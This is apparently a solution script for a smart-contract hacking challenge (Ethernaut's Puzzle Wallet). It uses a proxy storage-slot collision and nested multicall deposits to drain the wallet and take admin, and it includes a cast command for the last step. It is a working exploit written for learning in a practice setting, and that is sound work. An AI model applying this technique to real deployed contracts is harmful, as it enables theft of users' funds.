// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface iPuzzleWallet {
  function whitelisted(address _newAdmin) external;
  function proposeNewAdmin(address _newAdmin) external;
  function approveNewAdmin(address _expectedAdmin) external;
  function upgradeTo(address _newImplementation) external;
  function setMaxBalance(uint256 _maxBalance) external;
  function addToWhitelist(address addr) external;
  function deposit() external payable;
  function execute(address to, uint256 value, bytes calldata data) external payable;
  function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWalletHackScript is Script {
  iPuzzleWallet public puzzleWalletContract = iPuzzleWallet(payable(address(0x2d78FDc9ca792F402cD6010D02F6264c4A3dA9db)));

  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");
    address attackerAddress = 0x359bfB5160946a55f03c080c2DC6975C8F970d5C;
    vm.startBroadcast(attacker);

    // Call proposeNewAdmin as us to push us into owner address slot
    // console.log('owner start',puzzleWalletContract.owner());
    puzzleWalletContract.proposeNewAdmin(attackerAddress);
    // console.log('owner now', puzzleWalletContract.owner());

    // Now as owner can add ourselves to whitelist
    // console.log('am I whitelisted start?',puzzleWalletContract.whitelisted(attackerAddress));
    puzzleWalletContract.addToWhitelist(attackerAddress);
    // console.log('am I whitelisted end?',puzzleWalletContract.whitelisted(attackerAddress));

    // Now whitelisted if we can setMaxBalance we can be admin, but need to drain contract first
    // Need to exploit multicalls delegatecall to do so.
    // We want to call deposit twice so we can get credit for 2 deposits, but only send one value,
    // That way we can execute the contract and drain the whole thing. Otherwise we are always short value.

    // Trick is multicall blocks us from re-using value for multiple deposits, so we have to
    // nest a deposit within a multi-call that also deposits. That will use one value but enter twice.
    // Allowing us to cheat our balance and the check.
    // Our sencond recursive deposit call
    bytes[] memory nestedDeposit = new bytes[](1);
    nestedDeposit[0] = abi.encodeWithSelector(puzzleWalletContract.deposit.selector);

    bytes[] memory outerCalls = new bytes[](2);
    outerCalls[0] = abi.encodeWithSelector(puzzleWalletContract.deposit.selector); // Outer deposit
    outerCalls[1] = abi.encodeWithSelector(puzzleWalletContract.multicall.selector, nestedDeposit); // Reenter multicall

    // Now payload is built, send it off
    puzzleWalletContract.multicall{ value: 0.001 ether }(outerCalls);

    // Now we can execute and pull out 0.002 ether, after only entering 0.001 above
    puzzleWalletContract.execute(attackerAddress, 0.002 ether, "");

    // Now we can reset max balsance to override memory slot, making us admin due to poor memory layout
    // puzzleWalletContract.setMaxBalance(uint256(0x359bfB5160946a55f03c080c2DC6975C8F970d5C));
    // Wont let me call, will do from command line w/
    // cast send --private-key $PRIVATE_KEY 0x2d78FDc9ca792F402cD6010D02F6264c4A3dA9db "setMaxBalance(uint256)" 0x359bfB5160946a55f03c080c2DC6975C8F970d5C
    // we are then owner so we can submit
  }
}